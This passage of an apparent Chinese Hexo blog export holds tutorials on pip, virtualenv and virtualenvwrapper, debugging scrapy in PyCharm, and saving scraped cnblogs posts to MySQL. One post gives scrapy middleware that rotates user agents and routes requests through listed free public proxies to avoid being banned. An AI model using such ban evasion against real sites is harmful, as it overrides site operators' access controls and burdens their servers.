+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># pip list --outdated</div><div class="line">  SomePackage (Current: 1.0 Latest: 2.0)</div></pre></td></tr></table></figure>
+<ul>
+<li>pip升级包</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># pip install --upgrade SomePackage</div><div class="line">  [...]</div><div class="line">  Found existing installation: SomePackage 1.0</div><div class="line">  Uninstalling SomePackage:</div><div class="line">    Successfully uninstalled SomePackage</div><div class="line">  Running setup.py install for SomePackage</div><div class="line">  Successfully installed SomePackage</div></pre></td></tr></table></figure>
+<ul>
+<li>pip卸载包</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ (sudo) pip uninstall SomePackage</div><div class="line">  Uninstalling SomePackage:</div><div class="line">    /my/env/lib/pythonx.x/site-packages/somepackage</div><div class="line">  Proceed (y/n)? y</div><div class="line">  Successfully uninstalled SomePackage</div></pre></td></tr></table></figure>
+<ul>
+<li>导出当前系统中已经安装的包信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip freeze &gt; requirements.txt</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="2-pip使用实例"><a href="#2-pip使用实例" class="headerlink" title="2 pip使用实例"></a>2 pip使用实例</h4><ul>
+<li><p>安装redis</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(sudo)pip install redis</div></pre></td></tr></table></figure>
+</li>
+<li><p>卸载redis</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># pip uninstall redis</div><div class="line">Uninstalling redis:</div><div class="line">  /usr/lib/python2.6/site-packages/redis-2.9.1-py2.6.egg-info</div><div class="line">.....省略一些内容....</div><div class="line">Proceed (y/n)? y</div><div class="line">  Successfully uninstalled redis</div></pre></td></tr></table></figure>
+<ul>
+<li>查看待更新包</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pip list --outdate</div><div class="line">pygpgme (Current: 0.1 Latest: 0.3)</div><div class="line">pycurl (Current: 7.19.0 Latest: 7.19.3.1)</div><div class="line">iniparse (Current: 0.3.1 Latest: 0.4)</div></pre></td></tr></table></figure>
+<h4 id="3-pip参数解释"><a href="#3-pip参数解释" class="headerlink" title="3 pip参数解释"></a>3 pip参数解释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">$ pip --help</div><div class="line"></div><div class="line">Usage:</div><div class="line">  pip &lt;command&gt; [options]</div><div class="line"></div><div class="line">Commands:</div><div class="line">  install                     安装包.</div><div class="line">  uninstall                   卸载包.</div><div class="line">  freeze                      按着一定格式输出已安装包列表</div><div class="line">  list                        列出已安装包.</div><div class="line">  show                        显示包详细信息.</div><div class="line">  search                      搜索包，类似yum里的search.</div><div class="line">  wheel                       Build wheels from your requirements.</div><div class="line">  zip                         不推荐. Zip individual packages.</div><div class="line">  unzip                       不推荐. Unzip individual packages.</div><div class="line">  bundle                      不推荐. Create pybundles.</div><div class="line">  help                        当前帮助.</div><div class="line"></div><div class="line">General Options:</div><div class="line">  -h, --help                  显示帮助.</div><div class="line">  -v, --verbose               更多的输出，最多可以使用3次</div><div class="line">  -V, --version               现实版本信息然后退出.</div><div class="line">  -q, --quiet                 最少的输出.</div><div class="line">  --log-file &lt;path&gt;           覆盖的方式记录verbose错误日志，默认文件：/root/.pip/pip.log</div><div class="line">  --log &lt;path&gt;                不覆盖记录verbose输出的日志.</div><div class="line">  --proxy &lt;proxy&gt;             Specify a proxy in the form [user:passwd@]proxy.server:port.</div><div class="line">  --timeout &lt;sec&gt;             连接超时时间 (默认15秒).</div><div class="line">  --exists-action &lt;action&gt;    Default action when a path already exists: (s)witch, (i)gnore, (w)ipe, (b)ackup.</div><div class="line">  --cert &lt;path&gt;               证书.</div></pre></td></tr></table></figure>
+]]></content>
+      
+        <categories>
+            
+            <category> python </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> pip </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Virtualenv-Virtualenvwrapper使]]></title>
+      <url>/2015/09/virtualenv-virtualenvwrapper/</url>
+      <content type="html"><![CDATA[<h4 id="本文目录："><a href="#本文目录：" class="headerlink" title="本文目录："></a>本文目录：</h4><ul>
+<li>虚拟环境简介</li>
+<li>安装Virtualenv</li>
+<li>创建虚拟环境</li>
+<li>介绍增强版-Virtualenvwrapper</li>
+</ul>
+<h4 id="虚拟环境简介"><a href="#虚拟环境简介" class="headerlink" title="虚拟环境简介"></a>虚拟环境简介</h4><p>VirtualEnv用于在一台机器上创建多个独立的Python虚拟运行环境，多个Python环境相互独立，互不影响，它能够：</p>
+<ol>
+<li>在没有权限的情况下安装新套件</li>
+<li>不同应用可以使用不同的套件版本</li>
+<li>套件升级不影响其他应用</li>
+</ol>
+<p>虚拟环境是在Python解释器上的一个私有复制，你可以在一个隔绝的环境下安装packages，不会影响到你系统中全局的Python解释器。</p>
+<p>虚拟环境非常有用，因为它可以防止系统出现包管理混乱和版本冲突的问题。为每个应用程序创建一个虚拟环境可以确保应用程序只能访问它们自己使用的包，从而全局解释器只作为一个源且依然整洁干净去更多的虚拟环境。另一个好处是，虚拟环境不需要管理员权限。</p>
+<p>####安装Virtualenv</p>
+<p>大多数Linux发行版都提供一个virtualenv包。例如，Ubuntu用户就可以使用以下命令进行安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install python-virtualenv</div></pre></td></tr></table></figure>
+<p>如果你使用的是Mac OSX，你可以使用 easy_install 安装virtualenv：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo easy_install virtualenv</div></pre></td></tr></table></figure>
+<p>如果你使用的是Microsoft Windows或者是任何没有提供官方virtualenv包的操作系统，接下来你会有一个稍微复杂的安装过程。</p>
+<p>使用你的web浏览器，导航到 <a href="https://bitbucket.org/pypa/setuptools/" target="_blank" rel="external">https://bitbucket.org/pypa/setuptools/</a> ，setuptools安装程序的主页，在”Downloads”栏目找到链接下载一个叫 ez_setup.py 安装程序脚本。保存这个文件到你电脑的临时文件夹中，然后在那个目录下运行以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python ez_setup.py $ easy_install virtualenv</div></pre></td></tr></table></figure>
+<p>注：前一个命令必须由管理员权限的账户发出。在Microsoft Windows，以管理员身份选项运行命令提示符窗口。在基于Unix的系统中，两个安装命令前面必须加上 sudo 或作为 root 用户执行。一旦安装完毕，virtualenv程序可以通过普通账户执行。</p>
+<h3 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h3><p>安装好之后，我们就可以使用virtualenv命令创建Python虚拟环境了。这个命令有一个需要的参数：虚拟环境的名称。一个指定名称的文件夹和在里面的、与虚拟环境相关的所有文件会在当前目录下被创建。一般给虚拟环境约定命名为venv：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">nick@ubuntu:~$ virtualenv venv</div><div class="line">Running virtualenv with interpreter /usr/bin/python2</div><div class="line">New python executable in venv/bin/python2</div><div class="line">Also creating executable in venv/bin/python</div><div class="line">Installing setuptools, pip...done.</div></pre></td></tr></table></figure>
+<p>默认情况下，虚拟环境会依赖系统环境中的site packages，就是说系统中已经安装好的第三方package也会安装在虚拟环境中，如果不想依赖这些package，那么可以加上参数 <code>--no-site-packages</code>建立虚拟环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virtualenv --no-site-packages [虚拟环境名称]</div></pre></td></tr></table></figure>
+<p>现在你有一个venv文件夹和一个全新的虚拟环境，包含一个私有的Python解释器。使用虚拟环境的时候，你必须“激活”它。如果你是使用bash命令行工具(Linux和Mac OSX用户)，你可以使用这个命令激活虚拟环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ source venv/bin/activate</div></pre></td></tr></table></figure>
+<p>如果你是使用Microsoft Windows，激活命令是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; venv\Scripts\activate</div></pre></td></tr></table></figure>
+<p>当虚拟环境被激活了，Python解释器的位置会被添加到 PATH 中，但是这个改动并不是永久的；它只影响当前命令会话。提醒一下，你激活了虚拟环境，该激活命令会将环境的名称包含在命令提示符里面:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(venv)nick@ubuntu:~$</div></pre></td></tr></table></figure>
+<p>注意此时命令行会多一个<code>(venv)</code>，venv为虚拟环境名称，接下来所有模块都只会安装到该目录中去。<br>当你在虚拟环境中完成工作并想回到全局Python解释器，在命令提示符中输入 <code>deactivate</code>就可以了。</p>
+<h3 id="在虚拟环境安装Python套件"><a href="#在虚拟环境安装Python套件" class="headerlink" title="在虚拟环境安装Python套件"></a>在虚拟环境安装Python套件</h3><p>Virtualenv 附带有pip安装工具，因此需要安装的套件可以直接运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install [套件名称]</div></pre></td></tr></table></figure></p>
+<p>如果没有启动虚拟环境，系统也安装了pip工具，那么套件将被安装在系统环境中，为了避免发生此事，可以在<code>~/.bashrc</code>文件中加上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PIP_REQUIRE_VIRTUALENV=true</div></pre></td></tr></table></figure></p>
+<p>或者让在执行pip的时候让系统自动开启虚拟环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PIP_RESPECT_VIRTUALENV=true</div></pre></td></tr></table></figure></p>
+<h3 id="Virtualenvwrapper"><a href="#Virtualenvwrapper" class="headerlink" title="Virtualenvwrapper"></a>Virtualenvwrapper</h3><p>Virtaulenvwrapper是virtualenv的扩展包，用于更方便管理虚拟环境，它可以做：</p>
+<ol>
+<li>将所有虚拟环境整合在一个目录下</li>
+<li>管理（新增，删除，复制）虚拟环境</li>
+<li>切换虚拟环境</li>
+<li>…</li>
+</ol>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install virtualenvwrapper</div></pre></td></tr></table></figure>
+<p>此 时还不能使用virtualenvwrapper，需要以下两步：</p>
+<ol>
+<li>在~/.bashrc中添加行：<code>source /usr/local/bin/virtualenvwrapper.sh</code></li>
+<li>运行：<code>source ~/.bashrc</code></li>
+</ol>
+<p>此时virtualenvwrapper就可以使用了。并且在~/目录下生成了一个.virtualenv/目录用来存放我们创建的虚拟环境。</p>
+<ul>
+<li>新建虚拟环境<code>mkvirtualenv [虚拟环境名称]</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nick@ubuntu:~$ mkvirtualenv env1</div><div class="line">Running virtualenv with interpreter /usr/bin/python2</div><div class="line">New python executable in env1/bin/python2</div><div class="line">Also creating executable in env1/bin/python</div><div class="line">Installing setuptools, pip...done.</div><div class="line">(env1)nick@ubuntu:~$</div></pre></td></tr></table></figure>
+<p>此时在.virtualenvs目录中多出了一个env1目录</p>
+<ul>
+<li><p>列出虚拟环境列表<code>workon</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(env1)nick@ubuntu:~$ workon</div><div class="line">env1</div></pre></td></tr></table></figure>
+</li>
+<li><p>也可以使用<code>lsvirtualenv</code></p>
+</li>
+<li>启动/切换虚拟环境<code>workon [虚拟环境名称]</code></li>
+<li>删除虚拟环境<code>rmvirtualenv [虚拟环境名称]</code></li>
+<li>离开虚拟环境<code>deactivate</code></li>
+</ul>
+<p>来源：<a href="http://liuzhijun.iteye.com/blog/1872241" target="_blank" rel="external">http://liuzhijun.iteye.com/blog/1872241</a></p>
+<p>来源：<a href="http://flask123.sinaapp.com/article/39/" target="_blank" rel="external">http://flask123.sinaapp.com/article/39/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> python </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> virtualenv </tag>
+            
+            <tag> virtualenvwrapper </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[avoid-ban]]></title>
+      <url>/2015/09/avoid-ban/</url>
+      <content type="html"><![CDATA[<p>根据scrapy官方文档：<a href="http://doc.scrapy.org/en/master/topics/practices.html#avoiding-getting-banned" target="_blank" rel="external">http://doc.scrapy.org/en/master/topics/practices.html#avoiding-getting-banned</a>里面的描述，要防止scrapy被ban，主要有以下几个策略：</p>
+<ul>
+<li>动态设置user agent</li>
+<li>禁用cookies</li>
+<li>设置延迟下载</li>
+<li>使用Google cache</li>
+<li>使用IP地址池（Tor project、VPN和代理IP）</li>
+<li>使用Crawlera</li>
+</ul>
+<h4 id="1-创建middlewares-py"><a href="#1-创建middlewares-py" class="headerlink" title="1.创建middlewares.py"></a>1.创建middlewares.py</h4><p>scrapy代理IP、user agent的切换都是通过DOWNLOADER_MIDDLEWARES进行控制，下面我们创建middlewares.py文件。<br>文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">import random</div><div class="line">import base64</div><div class="line">from settings import PROXIES</div><div class="line"></div><div class="line">class RandomUserAgent(object):</div><div class="line">    def __init__(self, agents):</div><div class="line">        self.agents = agents</div><div class="line"></div><div class="line">    @classmethod</div><div class="line">    def from_crawler(cls, crawler):</div><div class="line">        return cls(crawler.settings.getlist(&apos;USER_AGENTS&apos;))</div><div class="line"></div><div class="line">    def process_request(self, request, spider):</div><div class="line">        print &quot;**************************&quot; + random.choice(self.agents)</div><div class="line">        request.headers.setdefault(&apos;User-Agent&apos;, random.choice(self.agents))</div><div class="line"></div><div class="line">class ProxyMiddleware(object):</div><div class="line">    def process_request(self, request, spider):</div><div class="line">        proxy = random.choice(PROXIES)</div><div class="line">        if proxy[&apos;user_pass&apos;] is not None:</div><div class="line">            request.meta[&apos;proxy&apos;] = &quot;http://%s&quot; % proxy[&apos;ip_port&apos;]</div><div class="line">            encoded_user_pass = base64.encodestring(proxy[&apos;user_pass&apos;])</div><div class="line">            request.headers[&apos;Proxy-Authorization&apos;] = &apos;Basic &apos; + encoded_user_pass</div><div class="line">            print &quot;**************ProxyMiddleware have pass************&quot; + proxy[&apos;ip_port&apos;]</div><div class="line">        else:</div><div class="line">            print &quot;**************ProxyMiddleware no pass************&quot; + proxy[&apos;ip_port&apos;]</div><div class="line">            request.meta[&apos;proxy&apos;] = &quot;http://%s&quot; % proxy[&apos;ip_port&apos;]</div></pre></td></tr></table></figure>
+<p>类RandomUserAgent主要用来动态获取user agent，user agent列表USER_AGENTS在settings.py中进行配置。</p>
+<p>类ProxyMiddleware用来切换代理，proxy列表PROXIES也是在settings.py中进行配置。</p>
+<h4 id="2-修改settings-py配置"><a href="#2-修改settings-py配置" class="headerlink" title="2.修改settings.py配置"></a>2.修改settings.py配置</h4><ul>
+<li>添加USER_AGENTS</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">USER_AGENTS = [</div><div class="line">    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</div><div class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;,</div><div class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;,</div><div class="line">    &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;,</div><div class="line">    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,</div><div class="line">]</div></pre></td></tr></table></figure>
+<ul>
+<li>添加代理ip设置PROXIES</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PROXIES = [</div><div class="line">    &#123;&apos;ip_port&apos;: &apos;117.136.234.9:80&apos;, &apos;user_pass&apos;: None&#125;,</div><div class="line">    &#123;&apos;ip_port&apos;: &apos;117.136.234.7:80&apos;, &apos;user_pass&apos;: None&#125;,</div><div class="line">    &#123;&apos;ip_port&apos;: &apos;117.136.234.10:80&apos;, &apos;user_pass&apos;: None&#125;,</div><div class="line">    &#123;&apos;ip_port&apos;: &apos;117.136.234.18:80&apos;, &apos;user_pass&apos;: None&#125;,</div><div class="line">]</div></pre></td></tr></table></figure>
+<p>代理IP可以网上搜索一下，上面的代理IP获取自：<a href="http://www.xici.net.co/。" target="_blank" rel="external">http://www.xici.net.co/。</a><br>刚开始看到这没明白代理ip什么意思，上面网址首页给出的ip就都是可以用的，如果上面给出的几个不能用了，可以去这个网站随便在copy几个下来。都是没有密码的，user_pass这项都不用动。</p>
+<ul>
+<li><p>禁用cookies</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* 设置下载延迟</div><div class="line">```DOWNLOAD_DELAY=3</div></pre></td></tr></table></figure>
+</li>
+<li><p>最后设置DOWNLOADER_MIDDLEWARES</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">DOWNLOADER_MIDDLEWARES = &#123;</div><div class="line">    &apos;cnblogs.middlewares.RandomUserAgent&apos;: 1, #随机user agent</div><div class="line">    &apos;scrapy.contrib.downloadermiddleware.httpproxy.HttpProxyMiddleware&apos;: 110,</div><div class="line">    &apos;cnblogs.middlewares.ProxyMiddleware&apos;: 100, #代理需要用到</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>以上几个措施可以单独使用也可以组合使用，这些方法我都放在了爬取cnblogs博客文章(保存json)这个工程中</p>
+<p>此工程github地址：<a href="https://github.com/lowkeynic4/crawl/tree/master/cnblogs%28%E9%98%B2ban%29" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/tree/master/cnblogs%28%E9%98%B2ban%29</a></p>
+<p>转自：<a href="http://www.cnblogs.com/rwxwsblog/p/4575894.html" target="_blank" rel="external">http://www.cnblogs.com/rwxwsblog/p/4575894.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[pycharm调试scrapy]]></title>
+      <url>/2015/08/pycharm-debug/</url>
+      <content type="html"><![CDATA[<p>我是使用pycharm编写的程序，因为新手嘛，ide的很多功能都很方便，这里说下pycharm调试scrapy程序：</p>
+<p>我们在运行爬虫时是调用scrapy程序，其第一个参数是crawl，在linux中使用下<code>which scrapy</code>我的输出是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tenshine@tenshine:~$ which scrapy</div><div class="line">/usr/bin/scrapy</div></pre></td></tr></table></figure>
+<p>然后用编辑工具打开这个文件，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import re</div><div class="line">import sys</div><div class="line"></div><div class="line">from scrapy.cmdline import execute</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    sys.argv[0] = re.sub(r&apos;(-script\.pyw|\.exe)?$&apos;, &apos;&apos;, sys.argv[0])</div><div class="line">    sys.exit(execute())</div></pre></td></tr></table></figure>
+<p>然后会发现scrapy是从cmdline导入东西，我们运行爬虫的功能就是从这个文件中导入的execute，所以去找这个文件，这个文件就是cmdline.py，我的系统是ubuntu，先<code>sudo updatedb</code>一下，然后<code>locate cmdline.py</code></p>
+<p>可能有几个同名的文件，但是看一下它在哪个目录中，我的目录是<code>/home/tenshine/.local/lib/python2.7/site-packages/scrapy/cmdline.py</code>，所以在pycharm的调试界面的Script项中填写此路径，然后Script parameters填写<code>crawl 爬虫name</code>，还需要填写一项Working directory，这是项目的路径，如果不填写这项的话会提示无法找到命令，所以最终的结果如下：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20150907175357.jpg" alt=""></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+            <tag> pycharm </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[scrapy爬取cnblogs博客文章(保存mysql)]]></title>
+      <url>/2015/07/scrapy-csdn-mysql/</url>
+      <content type="html"><![CDATA[<h5 id="这篇文章接上篇scrapy爬取cnblogs博客文章-保存json"><a href="#这篇文章接上篇scrapy爬取cnblogs博客文章-保存json" class="headerlink" title="这篇文章接上篇scrapy爬取cnblogs博客文章(保存json)"></a>这篇文章接上篇<a href="http://www.tenshine.party/scrapy%E7%88%AC%E5%8F%96cnblogs%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E4%BF%9D%E5%AD%98json/">scrapy爬取cnblogs博客文章(保存json)</a></h5><p>大部分和上篇文章没有区别，我直接说不同的地方，那就是处理数据的地方。</p>
+<h4 id="1-在item中新建一个字段"><a href="#1-在item中新建一个字段" class="headerlink" title="1.在item中新建一个字段"></a>1.在item中新建一个字段</h4><p>linkmd5id=scrapy.Field()<br>它的作用是用每篇文章的url作为唯一值，如果这个url在mysql数据库中没有存储，就将这条数据全部存进数据库，如果这个url已经存过了，就将这条信息update进数据库，没准这条信息中的题目或者摘要改变了呢。</p>
+<h4 id="2-更改pipelines-py"><a href="#2-更改pipelines-py" class="headerlink" title="2.更改pipelines.py"></a>2.更改pipelines.py</h4><p>因为我们的数据要存入到数据库中了，所以数据的处理就不能和json一样了，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">from twisted.enterprise import adbapi</div><div class="line">from datetime import datetime</div><div class="line">from hashlib import md5</div><div class="line">import MySQLdb</div><div class="line">import MySQLdb.cursors</div><div class="line">class MySQLStoreCnblogsPipeline(object):</div><div class="line">    def __init__(self, dbpool):</div><div class="line">        self.dbpool = dbpool</div><div class="line"></div><div class="line">    @classmethod</div><div class="line">    def from_settings(cls, settings):</div><div class="line">        dbargs = dict(</div><div class="line">            host=settings[&apos;MYSQL_HOST&apos;],</div><div class="line">            db=settings[&apos;MYSQL_DBNAME&apos;],</div><div class="line">            user=settings[&apos;MYSQL_USER&apos;],</div><div class="line">            passwd=settings[&apos;MYSQL_PASSWD&apos;],</div><div class="line">            charset=&apos;utf8&apos;,</div><div class="line">	        cursorclass = MySQLdb.cursors.DictCursor,</div><div class="line">            use_unicode= True,</div><div class="line">        )</div><div class="line">        dbpool = adbapi.ConnectionPool(&apos;MySQLdb&apos;, **dbargs)</div><div class="line">        return cls(dbpool)</div><div class="line"></div><div class="line">    #获取url的md5编码</div><div class="line">    def _get_linkmd5id(self, item):#url进行md5处理，为避免重复采集设计</div><div class="line">        return md5(item[&apos;link&apos;]).hexdigest()</div><div class="line"></div><div class="line">    #pipeline默认调用</div><div class="line">    def process_item(self, item, spider):</div><div class="line">        d = 